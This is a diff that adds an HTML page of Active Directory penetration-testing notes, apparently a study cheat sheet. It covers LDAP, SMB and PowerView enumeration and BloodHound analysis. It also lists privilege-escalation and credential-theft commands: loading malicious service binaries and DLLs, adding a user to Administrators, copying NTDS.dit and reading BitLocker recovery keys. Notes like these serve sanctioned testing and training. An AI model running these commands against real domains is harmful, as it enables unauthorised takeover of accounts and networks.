@@ -1,0 +1,328 @@
+<p>AD Cheat Sheet - <a href="https://wadcoms.github.io/#">https://wadcoms.github.io/#</a></p>
+<h3 id="ad-intro">AD Intro</h3>
+<ul>
+<li>Organizational Units (OUs)<ul>
+<li>Basically categories for group policy settings and permissions</li>
+<li>These can be hierarchical (for example, two OUs for two sub-organizations within a company)</li>
+</ul>
+</li>
+<li>Ensure to enumerate from all users we have access to</li>
+<li>When using xfreerdp, use <code>/d:</code> for domain name</li>
+</ul>
+<h3 id="manual-enumeration">Manual Enumeration</h3>
+<p><strong>User Enumeration</strong></p>
+<ul>
+<li>If something reveals the names of employees, use this to guess at usernames. Can try to see if each user doesn&#39;t have preauth
+<strong>Enumeration using Windows Tools</strong></li>
+<li><code>net user /domain</code> will display all domain user accounts<ul>
+<li><code>net user {user} /domain</code><ul>
+<li>This shows comments on a user, which can contain passwords</li>
+<li>This also shows logon scripts, which can be interesting</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>net group /domain</code> will give us the domain groups<ul>
+<li>A group assigns permissions to resources (users and other groups)</li>
+<li><code>net group &quot;{group}&quot; /domain</code></li>
+<li>Some uncommon but useful groups:<a href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a><ul>
+<li><a href="https://ss64.com/nt/syntax-security_groups.html">https://ss64.com/nt/syntax-security_groups.html</a> - all groups</li>
+<li>AD Recycle Bin <ul>
+<li>Can read deleted AD objects</li>
+<li><code>Get-ADObject -ldapfilter &quot;(&amp;(isDeleted=TRUE))&quot; -IncludeDeletedObjects</code></li>
+<li><code>Get-ADObject -ldapfilter &quot;(&amp;(objectclass=user)(DisplayName={name})(isDeleted=TRUE))&quot; -IncludeDeletedObjects -Properties *</code></li>
+</ul>
+</li>
+<li>(Enterprise) Key Admins<ul>
+<li>Used for managing Bitlocker keys</li>
+<li><code>Get-ADComputer -Filter * -Properties msFVE-RecoveryPassword | Select-Object Name, &#39;msFVE-RecoveryPassword&#39;</code></li>
+</ul>
+</li>
+<li>Pre–Windows 2000 Compatible Access<ul>
+<li>Can read most objects due to compatability</li>
+<li><code>Get-ADUser -Filter * -Properties MemberOf | Select-Object Name, MemberOf</code></li>
+<li><code>Get-ADObject -LDAPFilter &quot;(&amp;(objectCategory=Person)(objectClass=user))&quot; -Properties *</code></li>
+</ul>
+</li>
+<li>Server Operators<ul>
+<li>Can modify service binaries and restart them</li>
+<li><code>sc.exe config YourServiceName binPath= &quot;C:\path\to\malicious\binary.exe&quot;</code></li>
+<li><code>sc.exe start YourServiceName</code></li>
+</ul>
+</li>
+<li>Print Operators<ul>
+<li>Can be good for DLL hijacking</li>
+<li><code>rundll32.exe C:\path\to\malicious.dll,MainEntryPoint</code></li>
+</ul>
+</li>
+<li>Account Operators<ul>
+<li>Can add permissions to users or users to groups, such as becoming a local Administrator or managing a service running with higher privileges</li>
+<li><code>net localgroup Administrators TargetUser /add</code></li>
+<li><code>sc.exe sdset &quot;ServiceName&quot; &quot;D:(A;;CCLCRPRC;;;S-1-5-21-[SID of TargetUser])&quot;</code></li>
+</ul>
+</li>
+<li>Backup Operators<ul>
+<li>Can backup sensitive files, like NTDS.dit</li>
+<li><code>vssadmin create shadow /for=C:</code> </li>
+<li><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit</code></li>
+</ul>
+</li>
+<li>Dns Admins<ul>
+<li>Can perform dll hijacking to priv esc</li>
+<li><code>dnscmd /config /serverlevelplugindll \\malicious\share\malicious.dll</code>
+<strong>Enumeration with PowerShell and .NET Classes</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>LDAP is the communication channel that AD uses to query things<ul>
+<li>If a domain machine searches for a printer, the search query uses LDAP</li>
+<li><code>LDAP://{Hostname}:{port}/{/DN}</code></li>
+<li>LdapDomainDump - outputs to a pretty HTML page<ul>
+<li><code>sudo ldapdomaindump ldaps://{IP} -u &#39;{username}&#39; -p &#39;{password}&#39;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Checking for anonymous LDAP bind<ul>
+<li>`ldapsearch -x -H ldap://{IP} -b &quot;dc={domain},dc={TLD}&quot; </li>
+<li>This can yield a ton of information, such as users on the system<ul>
+<li><code>ldapsearch -x -H ldap://{IP} -b &quot;dc={domain},dc={tld}&quot; &quot;(objectClass=person)&quot;</code></li>
+<li>[More info](<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</a></li>
+<li>Users can have custom fields added, so check each user/group for passwords<ul>
+<li><code>| grep -iE &quot;pass|pwd|secret|cred|auth|token|key&quot;</code></li>
+<li>If we find anonymous ldap bind, slowing down for 5-10 mins and just processing the entire output could be nice</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Checking lockout policy: <code>ldapsearch -D &#39;{domain}&#39; -w &#39;{password}&#39; -p 389 -h {IP} -b &quot;dc={domain},dc={tld}&quot; -s sub &quot;*&quot; | grep lockoutThreshold</code></li>
+</ul>
+</li>
+<li>Distinguished names (DNs)<ul>
+<li>Uniquely identifies domain objects</li>
+<li><code>CN={obj_name},CN={container},DC={domain_component1},DC={domain_component1}</code><ul>
+<li><code>CN=Stephanie,CN=Users,DC=corp,DC=com</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><strong>.NET Classes</strong></p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0">https://learn.microsoft.com/en-us/dotnet/api/?view=net-8.0</a></li>
+<li>Has a class related to AD, <code>System.DirectoryServices.ActiveDirectory</code><ul>
+<li>Inside this class are multiple classes, like <code>Domain</code></li>
+<li>Can run <code>[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</code> to get the current Domain</li>
+</ul>
+</li>
+<li>Can use this info to construct LDAP path script</li>
+</ul>
+<p><strong>Using Search Functionality</strong></p>
+<ul>
+<li>Directory Entry<ul>
+<li>Class which encapsulates AD objects, can pass LDAP paths to it</li>
+<li>Can also be used to authenticate</li>
+</ul>
+</li>
+<li>Directory Searcher<ul>
+<li>Must be passed AD service we want to query</li>
+<li>Has FindAll(), which returns collection of all AD entries<ul>
+<li>This returns a ton, so we need to filter the script (<code>samAccountType=805306368</code> to filter for users)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Can turn this into a function where parameters can be passed</p>
+<ul>
+<li><p>Use with <code>Import-Module .\{name}.ps1</code> and <code>LDAPSearch -q &quot;({key}={value})&quot;</code></p>
+<ul>
+<li><code>LDAPSearch -q &quot;(samAccountType=805306368)&quot;</code></li>
+<li><code>LDAPSearch -q &quot;(objectclass=group)&quot;</code>
+```
+function LDAPSearch {
+param (
+[string]$q
+)</li>
+</ul>
+<p>$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
+$DistinguishedName = ([adsi]&#39;&#39;).distinguishedName</p>
+<p>$DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DistinguishedName&quot;)</p>
+<p>$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $q)</p>
+<p>return $DirectorySearcher.FindAll()</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>}
+```</p>
+<ul>
+<li>Can then use the output with filtering<ul>
+<li><code>foreach ($group in $(LDAPSearch -q &quot;(objectCategory=group)&quot;)) { $group.properties | select {$_.cn}, {$_.member}}</code><ul>
+<li>Just basically shows the CN and members for each group </li>
+<li>This will additionally show nested groups, which <code>net.exe</code> doesn&#39;t<h3 id="enumeration-with-powerview">Enumeration with PowerView</h3>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://powersploit.readthedocs.io/en/latest/Recon/">https://powersploit.readthedocs.io/en/latest/Recon/</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a><ul>
+<li>Import it using <code>Import-Module .\PowerView.ps1</code></li>
+<li>Don&#39;t wget the mf repo dumbass</li>
+</ul>
+</li>
+<li>Enumeration commands<ul>
+<li><code>Get-NetDomain</code> - gives basic domain info</li>
+<li><code>Get-NetUser</code> - lists users within the domain<ul>
+<li>Lotta info, so select the user (and other info) with <code>Get-NetUser | select CN,pwdlastset,lastlogon</code></li>
+<li>List descriptions: <code>Get-NetUser | Select-Object SamAccountName, Description</code></li>
+<li>Can also list service users with <code>-SPN</code></li>
+</ul>
+</li>
+<li><code>Get-NetGroup</code> - enumerate groups</li>
+<li><code>Get-NetComputer</code> - enumerate computer objects in the domain<ul>
+<li><code>Get-NetComputer | select operatingsystem,dnshostname</code></li>
+<li>For all IPs <code>Get-NetComputer | ForEach-Object { $_.dnshostname | ForEach-Object { [System.Net.Dns]::GetHostAddresses($_) | Select-Object IPAddressToString } }</code></li>
+</ul>
+</li>
+<li><code>Find-LocalAdminAccess</code> - determines if our user has administrative permissions on any computers in the domain<ul>
+<li>Uses the Service Control Manager, which maintains database of installed services and drivers on all Windows computers</li>
+</ul>
+</li>
+<li><code>Get-NetSession -ComputerName {computername} -Verbose</code><ul>
+<li>This one can return no data/wrong data depending on permissions</li>
+</ul>
+</li>
+<li><code>Get-ObjectAcl -Identity Stephanie &gt; output.txt</code> - Returns all access control entries (forming an Access Control List) for Stephanie<ul>
+<li><code>Convert-SidToName</code> will convert a SID to a domain name object</li>
+<li><code>ActiveDirectoryRights</code> can be pretty interesting, as <code>GenericAll</code> is the highest access permissions for an object<ul>
+<li><code>Get-ObjectAcl -Identity {identity} | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights</code> will show all SIDs that have GenericAll for the <code>identity</code> passed<ul>
+<li>The <code>identity</code> passed can be something like a domain group or user</li>
+</ul>
+</li>
+<li>Can then <code>{sid} | Convert-SidToName</code> to see what objects have those permissions on that identity<ul>
+<li>Can also just <code>Get-ObjectAcl -Identity &quot;{identity}&quot; | Where-Object { $_.ActiveDirectoryRights -eq &quot;GenericAll&quot; } | Select-Object -ExpandProperty SecurityIdentifier | Convert-SidToName</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>Find-DomainShare</code> will list all domain shares<ul>
+<li>Domain shares can be shared folders/files, printers, or other resources</li>
+<li>Look for interesting shares, like NETLOGON, SYSVOL, backups, docshares, or tools</li>
+<li>Can view internals using <code>ls \\{domain}\{share}</code> and read files with <code>cat</code><ul>
+<li>Will sometimes find encrypted Group Policy Preferences passwords, which have a known key and can be decrypted in kali with <code>gpp-decrypt</code><h3 id="manual-enumeration">Manual Enumeration</h3>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>PsLoggedOn.exe</code> - uses Remote Registry service to enumerate registry keys to see who&#39;s logged on to a system<ul>
+<li>Not enabled by default on workstations since Windows 8, but it enabled by default on servers like 2012, 2016, 2019, and 2022</li>
+<li>Usage: <code>.\PsLoggedOn.exe \\{computer name}</code></li>
+<li>If we found from <code>Find-LocalAdminAccess</code> that we have Admin access to a machine where another user is logged on, we should be able to take their hashes</li>
+</ul>
+</li>
+<li>Enumerating SMB<ul>
+<li><code>smbclient</code> is great for listing/connecting to smb shares<ul>
+<li>List smb shares: <code>smbclient -N -L //{domain}/ -I IP</code></li>
+<li>Connect to smb share: <code>smbclient -N //{domain}/{share} -I {IP}</code><ul>
+<li>With creds: <code>smbclient //{IP}/{share} -U {username}%{password}</code></li>
+</ul>
+</li>
+<li>To remove null bytes: <code>tr -d &#39;\000&#39; &lt; input_file &gt; output_file</code></li>
+</ul>
+</li>
+<li>With credentials, enumerate all shares with crackmapexec (shown below)</li>
+</ul>
+</li>
+<li>Enumerating Service Accounts<ul>
+<li>Service accounts are services launched by the system</li>
+<li>They&#39;re assigned a Service Principal Name (SPN) which associates the service to a service account in AD</li>
+<li><code>setspn.exe</code> is installed by default on Windows<ul>
+<li><code>setspn -L iis_service</code> </li>
+<li><code>Get-NetUser -SPN</code> will also list the service users</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Can use <code>crackmapexec</code> to enumerate shares/users/groups<ul>
+<li><code>crackmapexec smb {IP} -u {username} -p {password} --shares</code></li>
+<li><code>nxc smb {IP} -u {username} -p {password} --rid-brute 3000</code></li>
+<li>Anonymous logon would be username <code>anonymous</code> and empty password</li>
+<li>To enumerate everything:<ul>
+<li><code>crackmapexec smb {IP} -u {username} -p {password} --all</code></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="automatic-enumeration">Automatic Enumeration</h3>
+<p><strong>Enum4Linux</strong></p>
+<ul>
+<li>Just run <code>enum4linux {IP}</code>
+<strong>BloodHound/SharpHound</strong></li>
+<li>Capturing the system data with BloodHound:<ul>
+<li><a href="https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.1">SharpHound</a><ul>
+<li>Use version 1.1.1 for kali&#39;s 4.3.1 bloodhound</li>
+<li><code>Invoke-WebRequest {url} -Outfile {outfile}; Expand-Archive {outfile}</code></li>
+<li>Use with <code>Import-Module .\SharpHound.ps1</code></li>
+</ul>
+</li>
+<li><code>Invoke-BloodHound -CollectionMethod All -OutputDirectory {dir} -OutputPrefix {filename_prefix}</code></li>
+<li>Look at misc notes for getting the file off of the system</li>
+</ul>
+</li>
+<li>Apparently you can do this from KALI??<ul>
+<li><code>apt install bloodhound</code></li>
+<li><code>pip install bloodhound</code></li>
+<li><code>bloodhound-python -u {user} -p &quot;{password}&quot; -d {domain} -ns {IP} -c all</code></li>
+</ul>
+</li>
+<li>Analyzing the data with SharpHound<ul>
+<li>Use neo4j on kali machine - <code>sudo neo4j start</code><ul>
+<li>If not installed, just run <code>neo4j</code> and install the suggested option</li>
+<li>Go to localhost:7474 in the browser, set a new password</li>
+</ul>
+</li>
+<li>Now we can run <code>bloodhound</code><ul>
+<li>Sign in with new password set</li>
+<li>Upload the SharpHound zip folder using button on right</li>
+</ul>
+</li>
+<li>This will show all data collected AS THE CURRENT USER<ul>
+<li>It will have no idea if other users have local admin access on other workstations, only current user</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Things to check out<ul>
+<li>Path to high value targets from owned users</li>
+<li>Path to other users on the system<ul>
+<li>There might not be built in queries for this one, so go to each individual users and see the shortest paths to them</li>
+</ul>
+</li>
+<li>Queries:<ul>
+<li>All computers: <code>MATCH (m:Computer) RETURN m</code></li>
+<li>All users: <code>MATCH (m:User) RETURN m</code></li>
+<li>Active sessions: <code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</code></li>
+</ul>
+</li>
+<li>Interesting paths:<ol>
+<li>Find Workstations where Domain Users can RDP</li>
+<li>Find Servers where Domain Users can RDP</li>
+<li>Find Computers where Domain Users are Local Admin</li>
+<li>Shortest Path to Domain Admins from Owned Principals</li>
+<li>List Kerberoastable users</li>
+</ol>
+</li>
+<li>User SPNs (what can certain users access)</li>
+</ul>
+</li>
+</ul>
